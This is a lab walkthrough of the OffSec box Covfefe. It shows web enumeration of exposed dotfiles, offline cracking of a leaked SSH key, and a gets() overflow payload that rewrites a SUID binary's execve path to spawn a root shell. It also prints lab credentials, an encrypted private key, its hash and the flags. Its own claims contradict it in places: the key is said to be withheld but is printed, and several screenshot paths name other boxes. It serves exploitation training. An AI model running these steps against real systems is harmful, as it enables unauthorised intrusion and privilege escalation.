---
tags: [Offsec, Covfefe, Linux, SSH, PasswordCracking, SourceAnalysis, SUID, BufferOverflow, BinaryExploitation, Easy]
platform: OffSec
os: Debian Linux 32-bit
hostname: COVFEFE
difficulty: Easy
ip: $BoxIP
status: Complete
domain: None
---

# OffSec: Covfefe, Full Walkthrough

## The gist

Covfefe is a Linux box with a deliberately distracting Nginx service on port 80 and a custom Werkzeug application on port 31337. The custom application exposes dotfiles and a user's `.ssh` directory, including an encrypted RSA private key. Cracking the key passphrase provides SSH access as `simon`.

The local escalation is a custom SUID binary, `/usr/local/bin/read_message`. Source review shows an unsafe `gets()` call and a local `program` string adjacent to the input buffer. Supplying the expected name followed by an overwritten `/bin/sh` path makes the SUID program execute a root shell. The shell's effective UID confirms full root access.

## Box information

| Item | Value |
|---|---|
| Platform | OffSec lab |
| OS | Debian Linux, 32-bit |
| Hostname | COVFEFE |
| Domain | None |
| Difficulty | Easy |
| IP | `$BoxIP` |
| Main web service | Werkzeug 0.11.15 on `$WebPort` |
| SSH service | OpenSSH 7.4p1 |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Initialise the workspace | See section 1 below |
| 2 | Scan every TCP port | See section 2 below |
| 3 | Identify service versions | See section 3 below |
| 4 | Read robots.txt on the custom web service | See section 4 below |
| 5 | Check the decoy `/taxes` path and enumerate content | See section 5 below |
| 6 | Read the exposed history before attacking SSH | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Covfefe`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Covfefe
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/Offsec/Covfefe
boxset PlatformDir /home/kali/Platforms/Offsec/Covfefe
boxset WebPort 31337
boxset Username simon
boxset Password $Password
boxset KeyFile $BoxDir/loot/id_rsa
boxset HashFile $BoxDir/loot/id_rsa.john
boxset SuidPath /usr/local/bin/read_message
boxset ProgramPath /usr/local/sbin/message
boxset AuthorizedName Simon
boxset UserFlag 042a46f5e1a9516d8d90b61423fd1705
boxset RootFlag f45c3c59816a09f5e8f0fbcd8a081cff
```

The recovered key passphrase, flag values, and any hashes are reproduced in the private Credentials and secrets and Flags sections above. The command examples retain `$Password` as the shell variable used during the run.

## 1. Initialise the workspace

The standard helper creates the box directories, variables, and transcript before enumeration. `htblog` captures the complete terminal output so failed attempts and useful negative results are preserved.

```bash
boxstart $BoxName $BoxIP offsec
htblog
```

The manual run was kept under `$BoxDir`. The run was closed with `boxdone` after the user and root proofs were confirmed.

## 2. Scan every TCP port

The first scan covers all TCP ports because the useful application is not on a normal web port. `-Pn` skips host discovery when the lab filters ICMP, `-sS` performs a half-open SYN scan, and `--min-rate 2000` keeps the full sweep practical. `-oA` saves normal, grepable, and XML output together.

```bash
sudo nmap -Pn -sS -p- --min-rate 2000 \
  $BoxIP -oA $BoxDir/nmap/allports
```

The scan found three open TCP ports:

| Port | Service | Meaning |
|---|---|---|
| 22 | SSH | Likely foothold after a username and credential or key are recovered |
| 80 | HTTP | Default Nginx page, no useful application content |
| 31337 | Unknown/custom HTTP | Main enumeration target |

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/1.nmap-allports.png>)

SCREENSHOT: Full TCP scan. Red marks the three open ports. Green marks the fact that the entire range was checked, including the unusual high port.

> [!tip] ⚡ Efficiency
> **What we did:** Scanned the entire range once, then narrowed later scans to the discovered ports.
>
> **Faster approach:** Do not run version detection against all 65,535 ports after the sweep. Use the exact open-port list for the focused service scan.
>
> **Why:** Version detection and default scripts are more expensive than a basic connect check, and the full sweep has already established where they belong.

## 3. Identify service versions

The focused scan identifies the operating-system clues, web server versions, SSH version, and the framework behind port 31337. `-sC` runs Nmap's standard scripts, including HTTP and SSH checks, while `-sV` probes service versions.

```bash
sudo nmap -Pn -sS -sC -sV \
  -p 22,80,31337 \
  $BoxIP -oA $BoxDir/nmap/services
```

The results were:

- OpenSSH 7.4p1 on port 22
- Nginx 1.10.3 on port 80
- Werkzeug 0.11.15 with Python 3.5.3 on port 31337
- Linux service information, later confirmed as a 32-bit Debian system after SSH access

Port 80 returned the default Nginx landing page. Port 31337 returned a Werkzeug 404 at `/`, so the custom application became the priority.

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/2.nmap-services.png>)

SCREENSHOT: Focused service scan. Red marks the Werkzeug/Python service and the robots entries reported by Nmap. Green marks the normal SSH and default Nginx services.

## 4. Read robots.txt on the custom web service

`robots.txt` is not an access-control mechanism. It is a low-noise way to discover paths that the application owner does not want indexed, and those paths are often exactly where development files or sensitive content is exposed.

```bash
curl -i http://$BoxIP:$WebPort/robots.txt
```

The response disclosed:

```text
/.bashrc
/.profile
/taxes
```

![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/3.gobuster.png>)

SCREENSHOT: `robots.txt`. Red marks the dotfiles and `/taxes` path that should be requested directly.

> [!warning] 💡 Hint
> A `Disallow` line means “do not index this path,” not “deny access.” Always request each entry manually.

## 5. Check the decoy `/taxes` path and enumerate content

The `/taxes` request redirected to `/taxes/`. The trailing slash matters because Flask-style routes commonly distinguish the canonical directory route from the slashless form.

```bash
curl -i http://$BoxIP:$WebPort/taxes
curl -i http://$BoxIP:$WebPort/taxes/
```

The page confirmed that a flag existed elsewhere but did not disclose a useful credential or command-execution path. It was recorded as evidence, then enumeration continued.

```bash
gobuster dir \
  -u http://$BoxIP:$WebPort/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,py,html \
  -t 30 \
  -o $BoxDir/nmap/gobuster-31337.txt
```

Gobuster found the same interesting files plus `.bash_history`, `.ssh`, and `local.txt`:

- `.bash_history`
- `.bashrc`
- `.profile`
- `.ssh`
- `local.txt`
- `robots.txt`

![](<file:///home/kali/Platforms/Offsec/Zenphoto/screenshots/4.foothold.png>)

SCREENSHOT: `/taxes/` response. Red marks the message indicating that another file contains the flag. Do not capture the flag value.

![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/2.gobuster.png>)

SCREENSHOT: Gobuster results. Red marks `.bash_history`, `.ssh`, and `local.txt`. Green marks the successful 200 responses.

> [!tip] ⚡ Efficiency
> **What we did:** Used the small `dirb/common.txt` list with the relevant extensions after robots enumeration.
>
> **Alternative:** `feroxbuster` can recurse automatically, and `ffuf` is useful when fuzzing parameters or headers rather than only paths.
>
> **Why:** The application exposed the relevant dotfiles directly, so a large recursive scan would add noise without improving the result.

## 6. Read the exposed history before attacking SSH

Readable shell history is valuable because it reveals what the application owner actually used, not only what filenames happen to exist. It also gives a quick lead for local binaries and proof-file names.

```bash
curl -s http://$BoxIP:$WebPort/.bash_history \
  -o $BoxDir/loot/bash_history.txt
sed -n '1,160p' $BoxDir/loot/bash_history.txt
```

The history referenced `read_message`, `local.txt`, and ordinary local enumeration. That tied the web leak to the later SUID application and confirmed that `local.txt` was the user-level proof file.

![](<file:///home/kali/Platforms/Offsec/Zenphoto/screenshots/6.foothold2.png>)

SCREENSHOT: Exposed `.bash_history`. Red marks the `read_message` command. Green marks the later local-enumeration commands that identify the intended privilege path.

## 7. Recover the SSH private key

The `.ssh` listing exposed `id_rsa`, `authorized_keys`, and `id_rsa.pub`. The public-key comment identified the account as `simon`, so the private key could be tested against the open SSH service without guessing usernames.

```bash
curl -s http://$BoxIP:$WebPort/.ssh/
curl -s http://$BoxIP:$WebPort/.ssh/id_rsa \
  -o $BoxDir/loot/id_rsa
curl -s http://$BoxIP:$WebPort/.ssh/authorized_keys \
  -o $BoxDir/loot/authorized_keys

chmod 600 $BoxDir/loot/id_rsa
file $BoxDir/loot/id_rsa
awk '{print $3}' $BoxDir/loot/authorized_keys
```

The key was an encrypted PEM RSA private key, and the authorized-key comment identified `simon`. The private-key contents are intentionally not embedded in this write-up.

> [!warning] 💡 Hint
> Treat a discovered private key as a credential even if it is encrypted. Preserve it exactly, set mode `600`, and crack the key's passphrase offline rather than repeatedly trying arbitrary SSH passwords.

## 8. Crack the encrypted key passphrase

John the Ripper does not crack the PEM file directly. `ssh2john` extracts the key's encryption metadata into a John-compatible hash format. The original key remains unchanged for the later SSH connection.

```bash
ssh2john $BoxDir/loot/id_rsa > $BoxDir/loot/id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt \
  $BoxDir/loot/id_rsa.john
john --show $BoxDir/loot/id_rsa.john
```

The passphrase cracked successfully. It was stored with `loot cred` in the private box loot and is represented as `$Password` here.

```bash
boxset Username simon
boxset Password $Password
loot cred $Username $Password
loot key $BoxDir/loot/id_rsa
```

![](<file:///home/kali/Platforms/Offsec/Covfefe/screenshots/10.simon-enum.png>)

SCREENSHOT: The SSH foothold enumeration. Red marks the `simon` identity, and green marks the 32-bit Debian kernel detail.

> [!tip] ⚡ Efficiency
> **What we did:** Cracked one known encrypted key with `ssh2john` and RockYou.
>
> **Alternative:** `hashcat` can also process the converted key format if John is unavailable, but John is the shortest path for this file type on Kali.
>
> **Why:** The username was already confirmed from `authorized_keys`, so a broad SSH password spray would have been unnecessary and noisier.

## 9. Authenticate over SSH and confirm the foothold

The SSH key is now paired with a known username and recovered passphrase. Use it for authentication, then immediately confirm the account, hostname, kernel, working directory, and home-directory contents.

```bash
ssh -i $BoxDir/loot/id_rsa $Username@$BoxIP
```

Inside the shell:

```bash
id
hostname
uname -a
pwd
ls -la
```

The shell was `simon` on `covfefe`, running a 32-bit Debian 4.9 kernel. The home directory contained `local.txt`, the history file, and no direct sudo configuration. The open SSH service was therefore a stable foothold rather than only a one-command execution path.

## 10. Confirm the user proof privately

The exposed `local.txt` was already a strong clue, but the SSH shell lets us confirm its location and ownership directly. Read the value only into the private loot workflow; do not paste it into shared notes or screenshots.

```bash
ls -l /home/$Username/local.txt
cat /home/$Username/local.txt
loot flag user 042a46f5e1a9516d8d90b61423fd1705
```

The user proof was confirmed and stored privately. The value is reproduced in the private sections above.

## 11. Enumerate local privilege paths

Before attempting an exploit, check the common local escalation routes. `sudo -l` tests delegated commands, the SUID search finds programs that run with their owner's privileges, and the `find` query narrows attention to the custom binary named in the exposed history.

```bash
sudo -l 2>&1
find / -type f -perm -4000 -printf '%M %u %g %p\n' 2>/dev/null | sort
find / -type f \( -name 'read_message' -o -name '*message*' \) 2>/dev/null
```

`sudo` was not installed. The useful SUID result was:

```text
-rwsr-xr-x root staff /usr/local/bin/read_message
```

![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/8.foothold.png>)

SCREENSHOT: SUID enumeration. Red marks the custom root-owned `/usr/local/bin/read_message` binary. Green marks the standard SUID utilities that were not the intended path.

> [!warning] 💡 Hint
> A SUID bit is not automatically exploitable. Check the owner, group, input handling, source, and called programs. Custom SUID binaries deserve priority over standard utilities.

## 12. Read the custom binary's source

The source file `/root/read_message.c` was readable even though the privileged helper itself was owned by root. Source review is safer and faster than blind fuzzing because it reveals the validation condition, the vulnerable function, and the exact privileged operation.

```bash
ls -l /usr/local/bin/read_message /root/read_message.c
file /usr/local/bin/read_message
sed -n '1,160p' /root/read_message.c
```

The relevant source logic was:

```c
char program[] = "/usr/local/sbin/message";
char buf[20];
char authorized[] = "Simon";

printf("What is your name?\n");
gets(buf);

if (!strncmp(authorized, buf, 5)) {
    printf("Hello %s! Here is your message:\n\n", buf);
    execve(program, NULL, NULL);
}
```

The problems are connected:

1. `gets()` has no length argument and can write beyond the 20-byte `buf` array.
2. The first five bytes must match `Simon` because the comparison is case-sensitive.
3. `program` is another local array placed immediately after `buf` in the stack frame.
4. `execve()` runs whatever path remains in `program`, using the SUID process's effective privileges.

![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/9.root-shell.png>)

SCREENSHOT: Final exploit proof. Red marks `euid=0(root)`. Green marks that the real UID remains `simon`, showing the shell came from a SUID effective-UID transition.

> [!warning] 💡 Hint
> The source also contained a proof value in a comment. Do not copy comments from the full source into shared notes. Extract only the code needed to understand the vulnerability and keep the source file in private loot.

## 13. Confirm the layout with offline binary analysis

The manual run established the vulnerability from source. A local copy of the binary makes the stack layout and hardening properties easier to verify without repeatedly crashing the target. `checksec` reports common mitigations, `readelf` shows the ELF program headers and symbols, and `objdump` exposes the function's stack offsets.

```bash
scp -i $BoxDir/loot/id_rsa \
  $Username@$BoxIP:/usr/local/bin/read_message \
  $BoxDir/loot/read_message

file $BoxDir/loot/read_message
checksec --file=$BoxDir/loot/read_message
readelf -h -l -s $BoxDir/loot/read_message
objdump -d -M intel $BoxDir/loot/read_message \
  | sed -n '/<main>:/,/^$/p'
```

The binary is a 32-bit position-independent ELF with no stack canary and disabled NX. The disassembly places `buf` at `[ebp-0x30]` and `program` at `[ebp-0x1c]`, a 20-byte distance. This is why the exploit can overwrite the program string without needing a return-address gadget or injected shellcode.

> [!tip] ⚡ More efficient path
> **What we did:** Used the readable source to identify the adjacent arrays, then used local disassembly as confirmation.
>
> **Alternative:** Blindly send increasingly long inputs and inspect crashes. That is slower and risks losing a fragile service or missing the logic-level overwrite entirely.
>
> **Why:** When source is available, code review tells us what to overwrite. Static analysis should confirm the layout, not replace the source review.

## 14. Build the adjacent-string overwrite

The input is arranged so the first 20 bytes fill `buf` and the next bytes replace `program`:

```text
Simon               first five bytes satisfy strncmp()
AAAAAAAAAAAAAAA     remaining 15 bytes of the 20-byte buffer
/bin/sh             replacement program path
NUL                 terminates the replacement path
newline             lets gets() return
```

The embedded NUL is important. Without it, the old bytes that follow `/bin/sh` could remain part of the path and `execve()` would fail. The newline ends `gets()`, while the SSH TTY keeps the shell interactive.

The exact payload is:

```bash
printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'
```

Do not replace the five-character prefix with a different case or name. The source compares exactly five bytes against `Simon`.

## 15. Execute the SUID helper and obtain root

Run the helper from the SSH session. The subshell keeps the input stream open after the first line, which gives the new root shell an interactive stdin. `-tt` forces a pseudo-terminal for the SSH connection, making the resulting `/bin/sh` usable interactively.

If the original SSH session did not allocate a usable terminal, reconnect with `-tt` first:

```bash
ssh -tt -i $KeyFile $Username@$BoxIP
```

Then run the helper inside that session:

```bash
(printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'; cat) \
  | /usr/local/bin/read_message
```

The program printed its greeting and then returned a `#` shell prompt. Verify the effective identity immediately:

```bash
id
whoami
hostname
```

The important result was:

```text
uid=1000(simon) euid=0(root)
root
covfefe
```

The real UID remains `simon`, but the effective UID is root, which is the relevant privilege for this SUID process and its child shell.

## 16. Confirm root proof privately

The root shell can enumerate the proof files without exposing their values. Confirm ownership and paths first, then read the proof privately and store it with the loot helper.

```bash
find /root -maxdepth 1 -type f \
  \( -name 'proof.txt' -o -name 'flag.txt' \) \
  -printf '%M %u %g %p %s bytes\n'

cat /root/proof.txt
loot flag root f45c3c59816a09f5e8f0fbcd8a081cff
```

The root proof was confirmed and saved privately. Its value is reproduced in the private sections above.

## 17. Technical gotchas and corrections

1. **Port 80 was a decoy.** The default Nginx page did not identify the foothold. Port 31337 was the useful custom HTTP service.
2. **Robots is a lead, not a control.** The application exposed the disallowed dotfiles directly.
3. **`/taxes` redirects.** The canonical route was `/taxes/`; a 301 is not a dead end.
4. **The private key was encrypted.** An encrypted key still becomes useful once its passphrase is converted with `ssh2john` and cracked offline.
5. **The public key identified the account.** The `authorized_keys` comment removed the need to guess the SSH username.
6. **`sudo` was unavailable.** The SUID search and exposed history pointed to the custom helper instead.
7. **Source code beat blind fuzzing.** The vulnerable `gets()` call and adjacent `program` array explained the exact overwrite.
8. **The first five bytes matter.** The name comparison is case-sensitive and only accepts `Simon`.
9. **This is a data overwrite, not a classic return-address exploit.** The payload changes the string passed to `execve()`, so no shellcode, ROP gadget, or return-address offset is required.
10. **A TTY makes the shell usable.** `ssh -tt` and an open stdin stream prevent the overwritten `/bin/sh` from exiting immediately.
11. **Real UID versus effective UID.** `uid=1000` does not disprove success when `euid=0` is present. The SUID bit changes the effective identity.
12. **Do not publish source comments containing proof values.** Keep the complete source and proof files in private loot only.

## 18. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Port Triage]] -- classified SSH plus web as a Linux target
- [[RUNBOOK V2/Linux - Service Scan]] -- identified OpenSSH, Nginx, and Werkzeug versions
- [[RUNBOOK V2/Linux - Web Enum]] -- enumerated robots, dotfiles, `/taxes`, and the custom web root
- [[RUNBOOK V2/Linux - Credential Search]] -- recovered an encrypted SSH private key and cracked its passphrase
- [[RUNBOOK V2/Linux - Local Enum]] -- confirmed the user, kernel, home directory, and local privilege paths
- [[RUNBOOK V2/Linux - SUID Check]] -- identified the custom root-owned SUID helper
- [[OSCP/RUNBOOK V2/Linux - Binary Analysis]] -- confirmed ELF format, hardening, symbols, and stack layout offline
- [[RUNBOOK V2/Linux - Clean Down]] -- closed the shell, retained private loot, and recorded `boxdone`

## 19. Collect the flags

- `user.txt` / `local.txt`: `042a46f5e1a9516d8d90b61423fd1705` (value reproduced in the private sections above)
- `root.txt` / `proof.txt`: `f45c3c59816a09f5e8f0fbcd8a081cff` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 042a46f5e1a9516d8d90b61423fd1705
root: f45c3c59816a09f5e8f0fbcd8a081cff
```

## 20. Clean down
The exploit did not create persistence or modify a target file. The temporary state was limited to the SSH session and local evidence files. Close the privileged and SSH shells, keep the key and John hash in private loot, and record completion with `boxdone`.

```bash
exit
exit
boxdone
```

The manual run recorded `boxdone`. No target-side payload, account, cron entry, or service modification remained.

### Completion checklist

- [x] Workspace initialised
- [x] Full TCP scan completed
- [x] Nginx, SSH, and Werkzeug services identified
- [x] `robots.txt` reviewed
- [x] `/taxes/` checked
- [x] Gobuster found dotfiles and `.ssh`
- [x] `.bash_history` recovered
- [x] Encrypted SSH key recovered
- [x] `authorized_keys` identified the SSH user
- [x] Key passphrase cracked privately
- [x] SSH foothold as `simon` confirmed
- [x] User proof confirmed privately
- [x] SUID binaries enumerated
- [x] Custom SUID source reviewed
- [x] Buffer-to-program overwrite mapped
- [x] Root shell confirmed with `euid=0`
- [x] Root proof confirmed privately
- [x] No target persistence left behind
- [x] `boxdone` recorded in the manual run

## 21. Attack narrative in one page
1. [[RUNBOOK V2/Port Triage]] classified the host as Linux from SSH and web services.
2. [[RUNBOOK V2/Linux - Web Enum]] found the custom Werkzeug service and exposed dotfiles.
3. `.ssh/id_rsa` and `authorized_keys` disclosed an encrypted key and the `simon` username.
4. [[RUNBOOK V2/Linux - Credential Search]] converted the key with `ssh2john` and cracked its passphrase offline.
5. SSH provided a stable shell as `simon`.
6. [[RUNBOOK V2/Linux - SUID Check]] identified `/usr/local/bin/read_message` as a root-owned SUID helper.
7. Source review showed `gets()` overwriting the adjacent `program` string.
8. The input rewrote the path to `/bin/sh`, producing a shell with effective UID 0.
9. Root proof was confirmed privately and the run was closed with `boxdone`.

## Tools used

- `nmap`
- `curl`
- `gobuster`
- `ffuf`
- `feroxbuster`
- `ssh`
- `sudo`
- `python`
- `john`
- `hashcat`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| `simon` | Comment in the exposed `authorized_keys` file | SSH foothold |
| `simon` key passphrase | Cracked encrypted RSA private key | Unlock the SSH key |

Passwords and private-key material are reproduced in the private Credentials and secrets section above.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Covfefe"
export BoxIP="192.168.210.10"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Covfefe"
export Domain=""
export DCip=""
export Username="simon"
export Password="starwars"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="31337"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
simon:starwars
```

#### `loot/id_rsa`

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,BD8515E8D3A10829A4D710D5AFAC64AB

FCY9ADNWL6702rP3vBGwzSSNXMojtui0v94aefo2O0Wz0n75YcOAKuj1eNA6hnG5
qGAaJKI7exONZ3GGf+6JZjORn9yTrj6Cc/tZr6dw9BQFHCQcBPBPpWBZO2IGVsvJ
Mf5H50v4QvL9RJl0Zcn0wGKgcuK4m0SyWD1ZKTQ3O2peRCmHIc39cyGOFMSRqhVU
7iMryuPbNZdOuzK8F0mCKKdvOwLhfdEQh2GOKJJ8CAI+Pb/NEvIDkDlsh2t148/D
kExxOmmVS/NTP9ixyOXc7NL34GHP/mfw/OLVUBVGubEkWA/KdNXkYPWcv+RskwMU
Dz5JVSduyVMdlskKL1h11UETb+WDPGKktO+dYYnCupi4NGROuOcpj57B5gLOdmxy
uH7gqTltd6uzASFEXS7rKDniG5Fu8C6zab0bCbM0DDzAexAgPQpweJqvSfqpQpKP
vmAeXnYGu7tw+U5d6CypS0qhS2P07lyboANstYOBrSzFIZF7LuotgPBSGtfTIkYb
lH8dyk7VEjIZ51exC4ACdJ/Hqhe08m++2f729m/UL/McEGGiZ4r2df5lPIEq8X4b
Wdu0SYRIi0J0PoGRrUFJ85j8C+yQXV5CIMAC3LUeDlTUcTEZvhbV8E+tB/zDNEUK
WuH2+4dlUEA4kyiMsoZNUcgIzhbuF7FK+lDxybjsscRG6fDFECmphiqD+jel2C+b
QK4dOF23OoYwIbx/XFEa7VNRTnkzANQBi4ELGFsc4uZs9conJfb9T3EXrRJjX9jK
0abmJthTd3wbiZa10nGwhEzXUCVPvh1j+tbn6xHldsqEc4RjZLnXmalBJ6DxgTxn
24Ozy1+y0CsycEUHG7b3jTUMvlNs0VCAB7YJUZYHdlPwjMeAOklSeI0MgsmeMOXr
S+LZzoBq0gzmm5Va1hnjFRgBnDgEMNe1KVU+QZy1O2J0yJT/VaKeME80uOP3z/Q3
kUGmzgGM2gCrXDwbAKfQzUp8pUR0fZT0pGrgsprpWItCvUfymb8MzdmVD6qzCfYC
tskyUU6wpQrEH7rA244azObC/HlFulYFAQmNdilguTNpou4TMTXNFfHAuq3DZL67
RJks2xiJKK3XUbXuFP0QIpfHnDnjJIlCKBVDxcUWLCpARWI8OsY4qEY/DlDu3aU3
b3K/+LdyndDfbb7edi4OJob7A0bSdlFfOhSRlmyeSgFe5oFTvIAevL0ph3nhgik7
DELkQnFE/xc49nPtchYZDJ6ifExb5WTO8XHCZb+bjf1BX3kAKSTfRZeowbc+gfAD
ZxGvHc9T8B30hujl04UCPMXlVR/X5/m9I0hnZKIuRDsJH1waZ+CJj6I93T5GKUKT
kMyZLUf+pmzRbLwdyNuUe+QTTano8SyK9rMLlthoXxCUFeoF3Q1bNOV8CWbXCLgl
2s4BObMEU9B4fzSMHUa9LpXz8LQvv74L0mnDJ3Jk82+gQuk6P4haTd03MI9ecZ8U
B0u8R3H9rzAYYr31q2YbZo03enMkRFC9DaEz4P3hMGCuGErQ8tuX3I07hOZGtm8B
TJAwpCifrLpx1myEg4kz4OhvWk5cL9qV8SP48T0aBoXHtUZFHa6KBNUpoV8QMhyI
-----END RSA PRIVATE KEY-----
```

#### `loot/id_rsa.john`

```text
loot/id_rsa:$sshng$1$16$BD8515E8D3A10829A4D710D5AFAC64AB$1200$14263d0033562faef4dab3f7bc11b0cd248d5cca23b6e8b4bfde1a79fa363b45b3d27ef961c3802ae8f578d03a8671b9a8601a24a23b7b138d6771867fee896633919fdc93ae3e8273fb59afa770f414051c241c04f04fa560593b620656cbc931fe47e74bf842f2fd44997465c9f4c062a072e2b89b44b2583d592934373b6a5e44298721cdfd73218e14c491aa1554ee232bcae3db35974ebb32bc17498228a76f3b02e17dd11087618e28927c08023e3dbfcd12f20390396c876b75e3cfc3904c713a69954bf3533fd8b1c8e5dcecd2f7e061cffe67f0fce2d5501546b9b124580fca74d5e460f59cbfe46c9303140f3e4955276ec9531d96c90a2f5875d541136fe5833c62a4b4ef9d6189c2ba98b834644eb8e7298f9ec1e602ce766c72b87ee0a9396d77abb30121445d2eeb2839e21b916ef02eb369bd1b09b3340c3cc07b10203d0a70789aaf49faa942928fbe601e5e7606bbbb70f94e5de82ca94b4aa14b63f4ee5c9ba0036cb58381ad2cc521917b2eea2d80f0521ad7d322461b947f1dca4ed5123219e757b10b8002749fc7aa17b4f26fbed9fef6f66fd42ff31c1061a2678af675fe653c812af17e1b59dbb44984488b42743e8191ad4149f398fc0bec905d5e4220c002dcb51e0e54d4713119be16d5f04fad07fcc334450a5ae1f6fb876550403893288cb2864d51c808ce16ee17b14afa50f1c9b8ecb1c446e9f0c51029a9862a83fa37a5d82f9b40ae1d385db73a863021bc7f5c511aed53514e793300d4018b810b185b1ce2e66cf5ca2725f6fd4f7117ad12635fd8cad1a6e626d853777c1b8996b5d271b0844cd750254fbe1d63fad6e7eb11e576ca8473846364b9d799a94127a0f1813c67db83b3cb5fb2d02b327045071bb6f78d350cbe536cd1508007b6095196077653f08cc7803a4952788d0c82c99e30e5eb4be2d9ce806ad20ce69b955ad619e31518019c380430d7b529553e419cb53b6274c894ff55a29e304f34b8e3f7cff4379141a6ce018cda00ab5c3c1b00a7d0cd4a7ca544747d94f4a46ae0b29ae9588b42bd47f299bf0ccdd9950faab309f602b6c932514eb0a50ac41fbac0db8e1acce6c2fc7945ba560501098d762960b93369a2ee133135cd15f1c0baadc364bebb44992cdb188928add751b5ee14fd102297c79c39e3248942281543c5c5162c2a4045623c3ac638a8463f0e50eedda5376f72bff8b7729dd0df6dbede762e0e2686fb0346d276515f3a1491966c9e4a015ee68153bc801ebcbd298779e182293b0c42e4427144ff1738f673ed7216190c9ea27c4c5be564cef171c265bf9b8dfd415f79002924df4597a8c1b73e81f0036711af1dcf53f01df486e8e5d385023cc5e5551fd7e7f9bd23486764a22e443b091f5c1a67e0898fa23ddd3e4629429390cc992d47fea66cd16cbc1dc8db947be4134da9e8f12c8af6b30b96d8685f109415ea05dd0d5b34e57c0966d708b825dace0139b30453d0787f348c1d46bd2e95f3f0b42fbfbe0bd269c3277264f36fa042e93a3f885a4ddd37308f5e719f14074bbc4771fdaf301862bdf5ab661b668d377a73244450bd0da133e0fde13060ae184ad0f2db97dc8d3b84e646b66f014c9030a4289facba71d66c84838933e0e86f5a4e5c2fda95f123f8f13d1a0685c7b546451dae8a04d529a15f10321c88
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
$ [16:16:57] curl -s http://$BoxIP:$WebPort/.ssh/id_rsa
kali@kali:~/Platforms/Offsec/Covfefe [16:16:39] $ =curl -s http://$BoxIP:$WebPort/.ssh/id_rsacurl>
$ [16:18:00] curl -s http://$BoxIP:$WebPort/.ssh/id_rsa -o loot/id_rsa
$ [16:19:26] ssh2john loot/id_rsa > loot/id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt loot/id_rsa.john
kali@kali:~/Platforms/Offsec/Covfefe [16:16:57] $ =curl -s http://$BoxIP:$WebPort/.ssh/id_rsa -o loot/id_rsa
kali@kali:~/Platforms/Offsec/Covfefe [16:18:36] $ =ssh2john loot/id_rsa > loot/id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt loot/id_rsa.johnssh2john loot/id_rsa >
$ [16:19:48] john --show loot/id_rsa.john
$ [16:20:51] boxset Password starwars
$ [16:21:08] ssh -i loot/id_rsa $Username@$BoxIP
ms/Offsec/Covfefe [16:19:27] $ =john --show loot/id_rsa.johnjohnloot/id_rsa.john>
loot/id_rsa:starwars
kali@kali:~/Platforms/Offsec/Covfefe [16:19:48] $ =boxset Password starwars
[+] Password=starwars (saved to .env)
cp: 'loot/id_rsa' and '/home/kali/Platforms/Offsec/Covfefe/loot/id_rsa' are the same file
[+] Key saved:   id_rsa  →  loot/
kali@kali:~/Platforms/Offsec/Covfefe [16:20:51] $ =ssh -i loot/id_rsa $Username@$BoxIPsshloot/id_rsa>
Enter passphrase for key 'loot/id_rsa':
$ [16:24:20] loot flag user 042a46f5e1a9516d8d90b61423fd1705
$ [16:30:59] loot flag root f45c3c59816a09f5e8f0fbcd8a081cff
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Covfefe | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Enumerate dotfiles and development paths on custom web services; `robots.txt` is often a disclosure list rather than a protection mechanism.
- An encrypted SSH key is still a credential. Identify the account from its public-key comment, crack the key offline, and validate it once.
- Source review can turn a custom SUID binary into a precise exploit. The `gets()` call and adjacent string were more useful than blind buffer fuzzing.
- A SUID exploit does not always need shellcode or a return-address overwrite. Rewriting a privileged program path can be enough.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Dawn2|Dawn2]] -- custom binary analysis and buffer-overflow reasoning
- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- source and buffer-overflow exploitation concepts
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- Linux web enumeration, source review, and clean-down discipline
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- exposed web files, credential recovery, and SSH access

## External resources

- [John the Ripper project](https://www.openwall.com/john/)
- [ssh2john source](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
- [Linux `gets(3)` manual](https://man7.org/linux/man-pages/man3/gets.3.html)
- [Linux `execve(2)` manual](https://man7.org/linux/man-pages/man2/execve.2.html)
- [checksec](https://github.com/slimm609/checksec)
- [GTFOBins SUID reference](https://gtfobins.github.io/)

